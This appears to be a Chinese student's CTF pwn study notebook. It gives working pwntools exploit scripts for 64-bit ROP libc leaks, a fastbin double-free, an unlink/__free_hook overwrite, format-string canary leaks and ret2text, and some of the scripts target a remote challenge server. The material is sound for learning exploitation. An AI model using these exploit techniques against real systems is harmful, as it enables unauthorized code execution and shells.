---
title: "1.rop（64位泄露libc和）"
date: 2026-11-13 19:08:06
categories:
  - "知识点"
  - "ROP"
tags: ["fastbin", "unsorted-bin", "unlink", "free-hook", "格式化字符串", "ROP", "canary"]
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-rop/1.rop（64位泄露libc和）.md -->
0x00000000004006db : pop rdi ; ret

0x0000000000400511 : ret

![image-20260913175135064](/pwn-notes/images/notes/image-20260913175135064.png)

```python
from pwn import*
libc=ELF('./libc.so.6')
elf=ELF('./pwn2')
context(os="linux",arch="amd64")
context.log_level='info'
rop=ROP(elf)
#p=process('./pwn2')
p=remote('1.95.36.136',2134)
main=elf.symbols["main"]
pop_rdi=rop.find_gadget(["pop rdi","ret"]).address
pop_rsi=rop.find_gadget(["pop rsi","ret"]).address
pop_rdx=rop.find_gadget(["pop rdx","ret"]).address
ret=rop.find_gadget(["ret"]).address
write_plt=elf.plt["write"]
write_got=elf.got["write"]

payload=b'a'*0x48+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(write_got)+p64(pop_rdx)+p64(8)+p64(write_plt)+p64(main)

p.sendafter(b'your plan:\n',payload)
p.recvuntil(b'OK\n')
addr=u64(p.recv(8))

libc_base=addr-libc.symbols["write"]
system=libc_base+libc.symbols["system"]
bin_sh=libc_base+next(libc.search(b'/bin/sh\x00'))

payload1=b'a'*0x48+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)
p.sendafter(b'your plan:\n',payload1)
p.interactive()
```

# 2.fastbin attack 

![image-20260915191810950](/pwn-notes/images/notes/image-20260915191810950.png)

后门函数

没有清空指针

![image-20260915191947543](/pwn-notes/images/notes/image-20260915191947543.png)

照现在来说的话，根据fastbin

创建链表，修改fd指针为后门函数。

![image-20260915195940289](/pwn-notes/images/notes/image-20260915195940289.png)



脚本：

```python
from pwn import*
p=process('./pwn2')
context(os='linux',arch='amd64')
context.log_level='debug'
elf=ELF('./pwn2')
def add(idx,size,data):
    p.sendlineafter(b'Choice: ',b'1')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Size: ',str(size).encode())
    p.sendafter(b'Content: ',data.ljust(size,b'\x00'))
def dele(idx):
    p.sendlineafter(b'Choice: ',b'3')
    p.sendlineafter(b'Index: ',str(idx).encode())
def trigger():
    p.sendlineafter(b'Choice: ',b'4')
fake_chunk=elf.symbols["fake"]
win=elf.symbols["win"]

add(0,0x60,b'a')
add(1,0x60,b'b')

dele(0)
dele(1)
dele(0)

add(2,0x60,p64(fake_chunk))
add(3,0x60,b'c')
add(4,0x60,b'd')
add(5,0x60,p64(win))

trigger()
p.interactive()
```

代码：写的啥·

![image-20260915201152425](/pwn-notes/images/notes/image-20260915201152425.png)

为什么堆块大小是0x60





gdb调试：

![image-20260918172748732](/pwn-notes/images/notes/image-20260918172748732.png)

首先申请到一个堆块就是1

接下来是第二个

![image-20260918172846972](/pwn-notes/images/notes/image-20260918172846972.png)

![image-20260918173144225](/pwn-notes/images/notes/image-20260918173144225.png)

接下来删除堆块之后首先进入了fastbin

![image-20260918173307994](/pwn-notes/images/notes/image-20260918173307994.png)

![image-20260918173339810](/pwn-notes/images/notes/image-20260918173339810.png)

删除两个堆块之后的

![image-20260918175137434](/pwn-notes/images/notes/image-20260918175137434.png)

当再次删除同一个堆块时，就会在fastbin里面形成链表

接下来就开始修改fd指针指向的内容了。

![image-20260918175111422](/pwn-notes/images/notes/image-20260918175111422.png)

继续申请：

![image-20260918175800248](/pwn-notes/images/notes/image-20260918175800248.png)

![image-20260918175856142](/pwn-notes/images/notes/image-20260918175856142.png)

![image-20260918180025489](/pwn-notes/images/notes/image-20260918180025489.png)





![image-20260918180806354](/pwn-notes/images/notes/image-20260918180806354.png)

![image-20260918180749946](/pwn-notes/images/notes/image-20260918180749946.png)

# 3.unlink

![image-20260920191106378](/pwn-notes/images/notes/image-20260920191106378.png)

```python
def add(idx,size,content):
    p.sendlineafter(b'Choice: ',b'1')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Size: ',str(size).encode())
    p.sendafter(b'Content: ',content.ljust(size,b'\x00'))
```

```python

```

![image-20260920193507301](/pwn-notes/images/notes/image-20260920193507301.png)

只是show了8个字符，在这里泄露地址

![image-20260920193554025](/pwn-notes/images/notes/image-20260920193554025.png)

那么这个book存储的头指针到底存在哪里，

![image-20260920195349155](/pwn-notes/images/notes/image-20260920195349155.png)

book+int(n4)+8:

也就是如果我就只是将索引定为0，的话那么就是book+8;   8字节：64也就是0x40

所以就是book起始+0x40

![image-20260920195933835](/pwn-notes/images/notes/image-20260920195933835.png)

而为什么是0x80因为可以进unsortedbin，这样泄露libc。









这个时候*note=note-0x18

之后再次编辑0的话就会从note-0x18开始，那么先覆盖0x18之后到达note此时里面存的是note-0x18,之后的话就是note1的指针了，那么接着覆盖掉的话，那么再次show那么就会泄露free的地址。

之后两次的更改首先改掉note0的起始变成freee_hook,

所以之后再次修改note0的时候就直接是free_hook的地址，而不是像之前一样还是设置成note-0x18,因此下一次修改note0的时候还需要填充

![image-20260920212940952](/pwn-notes/images/notes/image-20260920212940952.png)

```python
from pwn import*
context(os='linux',arch='amd64')
context.log_level='debug'
#p=process('./pwn2')
p=remote('1.95.36.136',2057)
elf=ELF('./pwn2')
libc=ELF('./libc.so.6')


def add(idx,size,content):
    p.sendlineafter(b'Choice: ',b'1')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Size: ',str(size).encode())
    p.sendafter(b'Content: ',content.ljust(size,b'\x00'))
def edit(idx,length,content):
    p.sendlineafter(b'Choice: ',b'2')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Length: ',str(length).encode())
    p.sendafter(b'Content: ',content.ljust(length,b'\x00'))
def dele(idx):
    p.sendlineafter(b'Choice: ',b'3')
    p.sendlineafter(b'Index: ',str(idx).encode())
def show(idx):
     p.sendlineafter(b'Choice: ',b'4')
     p.sendlineafter(b'Index: ',str(idx).encode())
     #p.recvuntil(b'Content: ')
     #data=p.recv(8)
     #p.recvline()
     #return data

note=elf.sym["book"]+0x40
add(0,0x80,b'aaaa')
add(1,0x80,b'bbbb')
add(2,0x80,b'\bin\sh/x00')
fake_chunk=flat(
0,
0x81,
note-0x18,
note-0x10)
pay=fake_chunk.ljust(0x80,b'\x00')
pay+=flat(0x80,0x90)
edit(0,len(pay),pay)
dele(1)

pay1=b'a'*0x18+flat(note-0x18,elf.got["free"])
edit(0,len(pay1),pay1)

show(1)
p.recvuntil(b'Content: ')
free_addr=u64(p.recv(8))

libc.address=free_addr-libc.sym["free"]

pay1=flat(b'a'*0x18,libc.sym["__free_hook"])
edit(0,len(pay1),pay1)
edit(0,8,p64(libc.sym["system"]))

dele(2)

p.interactive()





```

修改完之后：

```python
from pwn import*
context(os='linux',arch='amd64')
context.log_level='debug'
#p=process('./pwn2')
p=remote('1.95.36.136',2057)
elf=ELF('./pwn2')
libc=ELF('./libc.so.6')


def add(idx,size,content):
    p.sendlineafter(b'Choice: ',b'1')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Size: ',str(size).encode())
    p.sendafter(b'Content: ',content.ljust(size,b'\x00'))
def edit(idx,length,content):
    p.sendlineafter(b'Choice: ',b'2')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Length: ',str(length).encode())
    p.sendafter(b'Content: ',content.ljust(length,b'\x00'))
def dele(idx):
    p.sendlineafter(b'Choice: ',b'3')
    p.sendlineafter(b'Index: ',str(idx).encode())
def show(idx):
     p.sendlineafter(b'Choice: ',b'4')
     p.sendlineafter(b'Index: ',str(idx).encode())
     #p.recvuntil(b'Content: ')
     #data=p.recv(8)
     #p.recvline()
     #return data

note=elf.sym["book"]+0x40
add(0,0x80,b'aaaa')
add(1,0x80,b'bbbb')
add(2,0x80,b'/bin/sh\x00')
fake_chunk=flat(
0,
0x81,
note-0x18,
note-0x10)
pay=fake_chunk.ljust(0x80,b'\x00')
pay+=flat(0x80,0x90)
edit(0,len(pay),pay)
dele(1)

pay1=b'a'*0x18+flat(note-0x18,elf.got["free"])
edit(0,len(pay1),pay1)

show(1)
p.recvuntil(b'Content: ')
free_addr = u64(p.recvn(6).ljust(8, b'\x00'))

libc.address=free_addr-libc.sym["free"]

pay1=flat(b'a'*0x18,libc.sym["__free_hook"])
edit(0,len(pay1),pay1)
edit(0,8,p64(libc.sym["system"]))

dele(2)

p.interactive()





```

# 4.cometosh

![image-20260921152253905](/pwn-notes/images/notes/image-20260921152253905.png)

有canary

![image-20260921152428510](/pwn-notes/images/notes/image-20260921152428510.png)

有格式化字符串漏洞，而且还在栈上，所以可以泄露。

![image-20260921154131213](/pwn-notes/images/notes/image-20260921154131213.png)

靠，没看懂canary在哪

![image-20260921154534479](/pwn-notes/images/notes/image-20260921154534479.png)

ebp减去0xc就是canary的地址。

![image-20260921154623333](/pwn-notes/images/notes/image-20260921154623333.png)

![image-20260921154641775](/pwn-notes/images/notes/image-20260921154641775.png)

![image-20260921154719162](/pwn-notes/images/notes/image-20260921154719162.png)

7c-4 /4=30

```python
from pwn import*
p=process('./pwn1')
context.log_level='debug'
pay=b'%30$p'
p.sendline(pay)
#canary=int(p.recv(10),16)
#print(hex(canary))
p.recvuntil(b'0x')
canary=int(p.recv(8),16)
print(hex(canary))

shell=0x80485cc
payload=b'a'*0x40+p32(canary)+p32(shell)
#p.recvuntil(b'*')
p.sendline(payload)
p.interactive()
```

![image-20260921181144976](/pwn-notes/images/notes/image-20260921181144976.png)

看好内存结构好吧

![image-20260921181306232](/pwn-notes/images/notes/image-20260921181306232.png)

31？

![image-20260921181805788](/pwn-notes/images/notes/image-20260921181805788.png)

0x80-0x4

![image-20260921181845173](/pwn-notes/images/notes/image-20260921181845173.png)

![image-20260921181904267](/pwn-notes/images/notes/image-20260921181904267.png)





```python
from pwn import*
p=process('./pwn1')
context.log_level='debug'
pay=b'%31$p'
p.sendline(pay)
#canary=int(p.recv(10),16)
#print(hex(canary))
p.recvuntil(b'0x')
canary=int(p.recv(8),16)
print(hex(canary))

shell=0x80485cc
payload=b'a'*0x40+p32(canary)+b'a'*12+p32(shell)
#p.recvuntil(b'*')
p.sendline(payload)
p.interactive()
```

# 5.echo（待续）

![image-20260921182953638](/pwn-notes/images/notes/image-20260921182953638.png)

![image-20260921183302795](/pwn-notes/images/notes/image-20260921183302795.png)

也是一道格式化字符串，32直接

canary地址-字符串地址  然后除以4  转化成十进制

64

canary地址-字符串地址  除以8 转化成十进制再加上6

这道64位canary就在22

![image-20260921184741522](/pwn-notes/images/notes/image-20260921184741522.png)

然后下面28位置就是有关libc地址。

这个我就先不弄了

```python
from pwn import*
p=process('./pwn2')
context.log_level='debug'
pay=b'%23$p'
p.recvuntil(b'message: ')
p.sendline(pay)
#canary=int(p.recv(10),16)
#print(hex(canary))
p.recvuntil(b'0x')
canary=int(p.recv(16),16)
print(hex(canary))


shell=0x4011ff
payload=b'a'*0x48+p32(canary)+b'a'*8+p32(shell)
p.recvuntil(b'*')
p.sendline(payload)
p.interactive()
'''
```

6.











# ret2text

![image-20260922190828741](/pwn-notes/images/notes/image-20260922190828741.png)



```python
from pwn import*
p=process('./pwn')
ret=0x40101a
p.recvuntil(b'a wish: ')
pay=b'a'*0x48+p64(ret)+p64(0x4014ba)
p.sendline(pay)
p.interactive()
```

2.

![image-20260922192216484](/pwn-notes/images/notes/image-20260922192216484.png)

<!-- sync-hash: f0bb8bb7925d81ddcdf6d7f4ba6199e8f481564fcbb65500fa7b31d9bcd1a141 -->
